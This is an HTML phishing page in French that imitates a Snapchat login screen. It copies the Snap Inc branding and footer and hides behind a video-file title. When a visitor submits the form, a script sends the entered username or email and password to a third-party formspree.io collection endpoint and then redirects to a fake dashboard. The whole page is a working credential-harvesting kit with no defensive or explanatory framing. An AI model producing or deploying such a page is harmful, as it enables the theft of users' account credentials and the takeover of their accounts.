<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>@rb.25zz.mp4</title>
  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .password-container {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
    }
    .toggle-password img {
      width: 20px;
      height: 20px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #fffc00;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #fff200;
    }
    .error-message {
      display: none;
      color: red;
      margin-top: 15px;
      font-size: 0.95em;
    }
    footer {
      position: absolute;
      bottom: 0;
      width: 100%;
      padding: 15px 0;
      text-align: center;
      font-size: 0.8em;
      color: #888;
    }
  </style>
</head>
<body>

<div class="login-box">
  <img src="logo.jpg" alt="Logo" width="150" style="display:block; margin: 0 auto 15px auto;">
  <h2>Connexion</h2>

  <form id="loginForm" action="https://formspree.io/f/xzzrqevd" method="POST">
    <input type="text" name="identifiant" placeholder="Nom d'utilisateur ou email" required>

    <div class="password-container">
      <input type="password" id="passwordInput" name="code" placeholder="Mot de passe" required>
      <button type="button" class="toggle-password" onclick="togglePassword()">
        <img src="eye-icon.svg" alt="Afficher mot de passe">
      </button>
    </div>

    <button type="submit">Se connecter</button>
    <button type="button" style="margin-top: 10px; background-color: #007bff; color: white;">S'inscrire</button>
  </form>

  <p id="errorMsg" class="error-message">Une erreur est survenue. Veuillez réessayer plus tard.</p>
</div>

<footer>
  Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
</footer>

<script>
  function togglePassword() {
    const input = document.getElementById("passwordInput");
    if (input.type === "password") {
      input.type = "text";
    } else {
      input.type = "password";
    }
  }

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const form = e.target;
    const data = new FormData(form);

    fetch(form.action, {
      method: "POST",
      body: data,
      headers: {
        'Accept': 'application/json'
      }
    }).then(response => {
      if (response.ok) {
        window.location.href = "dashboard.html";
      } else {
        document.getElementById("errorMsg").style.display = "block";
      }
    }).catch(() => {
      document.getElementById("errorMsg").style.display = "block";
    });
  });
</script>

</body>
</html>
